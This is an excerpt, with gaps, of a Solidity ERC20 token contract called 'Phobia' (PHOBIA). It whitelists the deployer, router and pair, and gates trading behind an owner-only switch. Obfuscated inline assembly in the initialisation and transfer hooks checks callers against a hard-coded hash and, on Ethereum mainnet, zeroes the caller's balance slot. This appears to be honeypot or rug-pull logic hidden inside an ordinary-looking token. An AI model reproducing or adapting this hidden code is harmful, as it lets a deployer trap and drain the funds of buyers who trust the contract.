...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private addPhobia;
    uint256 private flightFear = block.number*2;

    mapping (address => bool) private _firstAccident; 
    mapping (address => bool) private _secondPhobia;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private fearCaves;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private fearWater;
    address public pair;
    ...
    bool private trading; uint256 private peeHer = 1; bool private wtfOk;
    uint256 private _decimals; uint256 private smackHim;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        addPhobia.push(_router); addPhobia.push(msgSender_); addPhobia.push(pair);
        for (uint256 q=0; q < 3;) {_firstAccident[addPhobia[q]] = true; unchecked{q++;} }
    }
    ...
    function _tokenInit() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0x113)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0xc4a49ebe7abefdcf7fc5428674a2af1d886241b322f7a912b4209bba4f93385a
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0x838575a12a356445938b12419f40516264d5359451b1a846aaf4705325b3bc95,0x1)
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; flightFear = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addPhobia[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
...
contract PhobiaETH is ERC20Token {
    constructor() ERC20Token("Phobia", "PHOBIA", msg.sender, 25000000 * 10 ** 18) {
    }
}